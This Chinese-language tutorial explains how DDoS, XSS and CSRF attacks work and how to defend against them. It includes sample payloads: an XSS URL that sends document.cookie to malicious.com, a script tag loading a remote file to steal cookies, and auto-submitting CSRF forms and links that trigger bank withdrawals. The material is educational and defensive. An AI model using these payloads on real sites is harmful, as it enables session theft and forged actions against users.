# 简述 DDoS 攻击原理，如何防范它？

## 定义

DoS攻击，拒绝服务攻击，这种攻击行为使网站服务器充斥大量的要求回复的信息，消耗网络带宽或系统资源，导致网络或系统不胜负荷而停止提供正常的网络服务。

DDoS分布式拒绝服务，则主要利用 Internet上现有机器及系统的漏洞，攻占大量联网主机，使其成为攻击者的代理。当被控制的机器达到一定数量后，攻击者通过发送指令操纵这些攻击机同时向目标主机或网络发起DoS攻击，大量消耗其网络带和系统资源，导致该网络或系统瘫痪或停止提供正常的网络服务。由于DDoS的分布式特征，它具有了比DoS远为强大的攻击力和破坏性。

## 攻击原理

![img](https://pic2.zhimg.com/80/v2-b6ce6a7c344ae9b273727ff4a897291d_720w.jpg)

一个比较完善的DDos攻击体系分成四大部分：

- 攻击者（attacker也可以称为master）
- 控制傀儡机（handler）
- 攻击傀儡机（demon，又可称agent）
- 受害者（victim）

控制傀儡机与攻击傀儡机，分别用做控制和实际发起攻击。控制机只发布令而不参与实际的攻击，攻击机上发出DDoS的实际攻击包。对控制傀儡机与攻击傀儡机，攻击者有控制权或者是部分的控制权，并把相应的DDoS程序上传到这些平台上，这些程序与正常的程序一样运行并等待来自攻击者的指令，通常它还会利用各种手段隐藏自己不被别人发现。在平时，这些傀儡机器并没有什么异常，只是一旦攻击者连接到它们进行控制，并发出指令的时候，攻击愧儡机就成为攻击者去发起攻击了。

之所以采用这样的结构，一个重要目的是隔离网络联系，保护攻击者，使其不会在攻击进行时受到监控系统的跟踪。同时也能够更好地协调进攻，因为攻击执行器的数目太多，同时由一个系统来发布命令会造成控制系统的网络阻塞，影响攻击的突然性和协同性。而且，流量的突然增大也容易暴露攻击者的位置和意图。整个过程可分为：

1)扫描大量主机以寻找可入侵主机目标；

2)有安全漏洞的主机并获取控制权；

3)入侵主机中安装攻击程序；

4)用已入侵主机继续进行扫描和入侵。

当受控制的攻击代理机达到攻击者满意的数量时，攻击者就可以通过攻击主控机随时发出击指令。由于攻击主控机的位置非常灵活，而且发布命令的时间很短，所以非常隐蔽以定位。一旦攻击的命令传送到攻击操纵机，主控机就可以关闭或脱离网络，以逃避追踪，攻击操纵机将命令发布到各个攻击代理机。在攻击代理机接到攻击命令后，就开始向目标主机发出大量的服务请求数据包。这些数据包经过伪装，使被攻击者无法识别它的来源面且，这些包所请求的服务往往要消耗较大的系统资源。如果数百台甚至上千台攻击代理机同时攻击一个目标，就会导致目标主机网络和系统资源的耗尽，从而停止服务。有时，甚至会导致系统崩溃。

另外，这样还可以阻塞目标网络的防火墙和路由器等网络设备，进一步加重网络拥塞状况。于是，目标主机根本无法为用户提供任何服务。攻击者所用的协议都是一些非常常见的协议和服务。这样，系统管理员就难于区分恶意请求和正连接请求，从而无法有效分离出攻击数据包。

## 表现形式

1. 流量攻击，主要是针对网络带宽的攻击，即大量攻击包导致网络带宽被阻塞，合法网络包被虚假的攻击包淹没而无法到达主机
2. 资源耗尽攻击，主要是针对服务器主机的政击，即通过大量攻击包导致主机的内存被耗尽或CPU内核及应用程序占完而造成无法提供网络服务

## 攻击方式

- SYN Flood攻击

SYN Flood攻击是当前网络上最为常见的DDos攻击，也是最为经典的拒绝服务攻击，它利用了TCP协议实现上的一个缺陷，通过向网络服务所在端口发送大量的伪造源地址的半连接请求，造成目标服务器中的半连接队列被占满，耗费CPU和内存资源，使服务器超负荷，从而阻止其他合法用户进行访问。这种攻击早在1996年就被发现，但至今仍然显示出强大的生命力，可谓“长生不老”。很多操作系统，甚至防火墙、路由器都无法有效地防御这种攻击，而且由于它可以方便地伪造源地址，追查起来非常困难。

- TCP全连接攻击

这种攻击是为了绕过常规防火墙的检查而设计的，一般情况下，常规防火墙大多具备syn cookies或者syn proxy能力，能够有效应对伪造的IP攻击，但对于正常的TCP连接是放过的。但殊不知很多网络服务程序能接受的TCP连接数是有限的，一旦有大量的TCP连接，即便是正常的，也会导致网站访问非常缓慢甚至无法访问，正所谓“多情总被无情伤”。TCP全连接攻击就是通过许多僵尸主机不断地与受害服务器建立大量的TCP连接，直到服务器的内存等资源被耗尽而被拖跨，从而造成拒绝服务，这种攻击的特点是可绕过一般防火墙的防护而达到攻击目的。

- TCP混乱数据包攻击

TCP混乱数据包攻击与Syn Flood攻击类似，发送伪造源IP的TCP数据包，只不过TCP头的TCP Flags部分是混乱的，可能是syn、ack、syn+ack、syn+rst等等，会造成一些防护设备处理错误锁死，消耗服务器CPU内存的同时还会堵塞带宽，在迷惑对手的时候施展最后的致命一击。

- UDP Flood攻击

UDP Flood是日渐猖獗的流量型DOS攻击，原理也很简单。常见的情况是利用大量UDP小包冲击DNS服务器或Radius认证服务器、流媒体视频服务器。100k PPS的UDP Flood经常将线路上的骨干设备例如防火墙打瘫，造成整个网段的瘫痪。由于UDP协议是一种无连接的服务，在UDP FLOOD攻击中，攻击者可发送大量伪造源IP地址的小UDP包。但是，由于UDP协议是无连接性的，所以只要开了一个UDP的端口提供相关服务的话，那么就可针对相关的服务进行攻击。

- DNS Flood攻击

UDP DNS Query Flood攻击实质上是UDP Flood的一种，但是由于DNS服务器的不可替代的关键作用，一旦服务器瘫痪，影响一般都很大。UDP DNS Query Flood攻击采用的方法是向被攻击的服务器发送大量的域名解析请求，通常请求解析的域名是随机生成或者是网络世界上根本不存在的域名，被攻击的DNS服务器在接收到域名解析请求的时候首先会在服务器上查找是否有对应的缓存，如果查找不到并且该域名无法直接由服务器解析的时候，DNS服务器会向其上层DNS服务器递归查询域名信息。根据微软的统计数据，一台DNS服务器所能承受的动态域名查询的上限是每秒钟9000个请求。而我们知道，在一台PC机上可以轻易地构造出每秒钟几万个域名解析请求，足以使一台硬件配置极高的DNS服务器瘫痪，由此可见DNS服务器的脆弱性。

- CC攻击

CC攻击(Challenge Collapsar)是DDOS攻击的一种，是利用不断对网站发送连接请求致使形成拒绝服务的攻击。相比其它的DDOS攻击，CC攻击是应用层的，主要针对网站。CC主要是用来攻击页面的，CC就是模拟多个用户（多少线程就是多少用户）不停地进行访问那些需要大量数据操作（就是需要大量CPU时间）的页面，造成服务器资源的浪费，CPU长时间处于100%，永远都有处理不完的连接直至就网络拥塞，正常的访问被中止。

这种攻击主要是针对存在ASP、JSP、PHP、CGI等脚本程序，并调用MSSQL Server、MySQLServer、Oracle等数据库的网站系统而设计的，特征是和服务器建立正常的TCP连接，并不断的向脚本程序提交查询、列表等大量耗费数据库资源的调用，典型的以小博大的攻击方法。这种攻击的特点是可以完全绕过普通的防火墙防护，轻松找一些Proxy代理就可实施攻击，缺点是对付只有静态页面的网站效果会大打折扣，并且有些Proxy会暴露攻击者的IP地址。

## 防护策略

1. 采用高性能的网络设备

抗DDoS攻击首先要保证网络设备不能成为瓶颈，因此选择路由器、交换机、硬件防火墙等设备的时候要尽量选用知名度高、口碑好的产品。再就是假如和网络提供商有特殊关系或协议的话就更好了，当大量攻击发生的时候请他们在网络接点处做一下流量限制来对抗某些种类的DDoS攻击是非常有效的。

2. 尽量避免NAT的使用

无论是路由器还是硬件防护墙设备都要尽量避免采用网络地址转换NAT的使用，除了必须使用NAT，因为采用此技术会较大降低网络通信能力，原因很简单，因为NAT需要对地址来回转换，转换过程中需要对网络包的校验和进行计算，因此浪费了很多CPU的时间。

3. 充足的网络带宽保证

网络带宽直接决定了能抗受攻击的能力，假若仅有10M带宽，无论采取何种措施都很难对抗现在的 SYN Flood攻击，当前至少要选择100M的共享带宽，1000M的带宽会更好，但需要注意的是，主机上的网卡是1000M的并不意味着它的网络带宽就是千兆的，若把它接在100M的交换机上，它的实际带宽不会超过100M，再就是接在100M的带宽上也不等于就有了百兆的带宽，因为网络服务商很可能会在交换机上限制实际带宽为10M。

4. 升级主机服务器硬件

在有网络带宽保证的前提下，尽量提升硬件配置，要有效对抗每秒10万个SYN攻击包，服务器的配置至少应该为：P4 2.4G/DDR512M/SCSI-HD，起关键作用的主要是CPU和内存，内存一定要选择DDR的高速内存，硬盘要尽量选择SCSI的，要保障硬件性能高并且稳定，否则会付出高昂的性能代价。

5. 把网站做成静态页面

大量事实证明，把网站尽可能做成静态页面，不仅能大大提高抗攻击能力，而且还给黑客入侵带来不少麻烦，到现在为止还没有出现关于HTML的溢出的情况，新浪、搜狐、网易等门户网站主要都是静态页面。

此外，最好在需要调用数据库的脚本中拒绝使用代理的访问，因为经验表明使用代理访问我们网站的80%属于恶意行为。

# XSS攻击

Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。

XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。

而由于直接在用户的终端执行，恶意代码能够直接获取用户的信息，或者利用这些信息冒充用户向网站发起攻击者定义的请求。

在部分情况下，由于输入的限制，注入的恶意脚本比较短。但可以通过引入外部的脚本，并由浏览器执行，来完成比较复杂的攻击策略。

这里有一个问题：用户是通过哪种方法“注入”恶意脚本的呢？

不仅仅是业务上的“用户的 UGC 内容”可以进行注入，包括 URL 上的参数等都可以是攻击的来源。在处理输入时，以下内容都不可信：

- 来自用户的 UGC 信息
- 来自第三方的链接
- URL 参数
- POST 参数
- Referer （可能来自不可信的来源）
- Cookie （可能来自其他子域注入）

根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。

### 存储型 XSS

存储型 XSS 的攻击步骤：

1. 攻击者将恶意代码提交到目标网站的数据库中。
2. 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。
3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。

#### 例子

论坛中加入

```html
<script>alert('hello,XSS')</script>
```

![image](https://galiyy.github.io/images/20191001/20191001173515.png)

```html
<script src="http://xxx.xxx.xxx.xxx/xxx.js"></script>
```

可以获取别人cookie，将代码注入目标服务器中

### 反射型 XSS

反射型 XSS 的攻击步骤：

1. 攻击者构造出特殊的 URL，其中包含恶意代码。
2. 用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。
3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。

反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。

由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。

POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。

#### 例子

点击`www.example.com?search=<script>window.location='http://malicious.com/?data=' + document.cookie</script>` 

### DOM 型 XSS

DOM 型 XSS 的攻击步骤：

1. 攻击者构造出特殊的 URL，其中包含恶意代码。
2. 用户打开带有恶意代码的 URL。
3. 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。

### 案例漏洞总结

下面我们来系统的看下 XSS 有哪些注入的方法：

- 在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。
- 在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。
- 在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。
- 在标签的 href、src 等属性中，包含 `javascript:` 等可执行代码。
- 在 onload、onerror、onclick 等事件中，注入不受控制代码。
- 在 style 属性和标签中，包含类似 `background-image:url("javascript:...");` 的代码（新版本浏览器已经可以防范）。
- 在 style 属性和标签中，包含类似 `expression(...)` 的 CSS 表达式代码（新版本浏览器已经可以防范）。

总之，如果开发者没有将用户输入的文本进行合适的过滤，就贸然插入到 HTML 中，这很容易造成注入漏洞。攻击者可以利用漏洞，构造出恶意的代码指令，进而利用恶意代码危害数据安全。

## 预防

防止浏览器执行恶意代码：

- 防止 HTML 中出现注入
- 防止 JavaScript 执行时，执行恶意代码

预防存储型和反射型 XSS：

- 改成纯前端渲染，把代码和数据分隔开
- 对 HTML 做充分转义

DOM 型 XSS 攻击：

- 避免在字符串中拼接不可信数据

# CSRF攻击

CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。

一个典型的CSRF攻击有着如下的流程：

- 受害者登录a.com，并保留了登录凭证（Cookie）。
- 攻击者引诱受害者访问了b.com。
- b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带a.com的Cookie。
- a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。
- a.com以受害者的名义执行了act=xx。
- 攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让a.com执行了自己定义的操作。

### GET类型的CSRF

GET类型的CSRF利用非常简单，只需要一个HTTP请求，一般会这样利用：

```
 ![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/ff0cdbee.example/withdraw?amount=10000&for=hacker)
```

受害者访问img后，浏览器向下面URL发出HTTP请求。bank.example就会收到包含受害者登录信息的一次跨域请求。

```
http://bank.example/withdraw?account=xiaoming&amount=10000&for=hacker
```

### POST类型的CSRF

```
 <form action="http://bank.example/withdraw" method=POST>
    <input type="hidden" name="account" value="xiaoming" />
    <input type="hidden" name="amount" value="10000" />
    <input type="hidden" name="for" value="hacker" />
</form>
<script> document.forms[0].submit(); </script> 
```

访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。

POST类型的攻击通常比GET要求更加严格一点，但仍并不复杂。任何个人网站、博客，被黑客上传页面的网站都有可能是发起攻击的来源，后端接口不能将安全寄托在仅允许POST上面。

### 链接类型的CSRF

链接类型的CSRF并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：

```
 <a href="http://test.com/csrf/withdraw.php?amount=1000&for=hacker" taget="_blank">
  重磅消息！！
  <a/>
```

由于之前用户登录了信任的网站A，并且保存登录状态，只要用户主动访问上面的这个PHP页面，则表示攻击成功。

## 防护策略

- 阻止不明外域的访问
  - 同源检测
  - Samesite Cookie
- 提交时要求附加本域才能获取的信息
  - CSRF Token
  - 双重Cookie验证

# XSS与CSRF区别

xss：用户过分信任网站，放任来自浏览器地址栏代表的那个网站代码在自己本地任意执行。如果没有浏览器的安全机制限制，xss代码可以在用户浏览器为所欲为；

csrf：网站过分信任用户，放任来自所谓通过访问控制机制的代表合法用户的请求执行网站的某个特定功能。

xss原理上利用的是浏览器**可以拼接成任意的javascript**，然后**黑客拼接好javascript**让浏览器自动地给服务器端发出多个请求（get、post请求）。

csrf原理上利用的是网站服务器端所有参数都是**可预先构造**的原理，然后**黑客拼接好具体请求url**，可以引诱你提交他构造好的请求



